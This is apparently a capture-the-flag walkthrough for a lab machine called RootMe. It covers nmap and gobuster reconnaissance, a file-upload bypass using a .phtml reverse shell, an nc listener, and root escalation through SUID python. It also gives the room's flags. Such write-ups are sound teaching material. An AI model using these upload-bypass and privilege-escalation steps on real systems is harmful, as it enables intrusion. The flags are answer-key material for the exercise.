### RootMe


#### Deploy the machine

export IP: 10.10.43.146


#### Reconnaissance
Scan the machine, how many ports are open?

- port 44442 is not included since status is filtered

```
                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.43.146 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 08:27 EDT
Nmap scan report for 10.10.43.146
Host is up (0.66s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp    open     http            Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
44442/tcp filtered coldfusion-auth
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.26 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]

```

What version of Apache is running?
- 2.4.29


What service is running on port 22?
- ssh


What is the hidden directory?
- /panel/

```


┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]
└─$ gobuster dir -u "http://10.10.43.146:80" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o /home/kali/ken/MoonShine/CTF/RootMe/gobuster_scan.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.43.146:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/18 08:31:57 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.43.146/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.43.146/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.43.146/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.43.146/panel/]  
Progress: 5864 / 220561 (2.66%)                                                  ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2022/08/18 08:39:06 Finished
===============================================================
                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]
└─$ 

```

#### Getting a shell

Find a form to upload and get a reverse shell, and find the flag.


![[Pasted image 20220818090736.png]]

- created reverse_shell.phtml, since php is blacklisted and we also cannot bypass client side filter:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]
└─$ ls
gobuster_scan.txt  nmap_results.txt  README.md  reverse_shell.jpg  reverse_shell.php  reverse_shell.phtml
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]
└─$ 

```

After uploading the payload, go to http://ip:80/uploads/reverse_shell.phtml to obtain a shell on nc listener:

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234                                  
listening on [any] 1234 ...
connect to [10.4.73.167] from (UNKNOWN) [10.10.43.146] 35740
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:07:17 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

- Once you got a shell, try to stabilize it first:

```

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@rootme:/$ fg
www-data@rootme:/$ stty raw -echo
stty raw -echo
www-data@rootme:/$ fg
bash: fg: current: no such job
www-data@rootme:/$ export TERM=xterm
www-data@rootme:/$
```

- Then search for the file user.txt below:

```
www-data@rootme:/$ find / -type f -name user.txt
/var/www/user.txt

```

- user.txt is located at /var/www/
- try to cat /var/www/user.txt to get the first flag:

```
www-data@rootme:/$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
www-data@rootme:/$ ^C
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 


```

#### Privilege escalation

- Using the lectures from beginner path, SUID part, we can check for SUID using the following command:

```
www-data@rootme:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
===OMMITED====
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate

```


Search for files with SUID permission, which file is weird?

/usr/bin/python

Find a form to escalate your privileges.

Tried using shell on GTFObins, but to no luck:

```
python -c 'import os; os.system("/bin/sh")'
-data@rootme:/$ python -c 'import os; os.system("/bin/sh")'
$ whoami
www-data

```

- After multiple trial and error, i found the exploit for this machine:
  
  ![[Pasted image 20220818094330.png]]
Note: disregard the sudo (as we don't have privileges); command 1
then remove the ./ in the first part.

Result:

```
$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
/bin/sh: 8: ./python: not found
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'    
# whoami
root
# 

```

look for the flag then complete the room:

```
# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
# 


```

END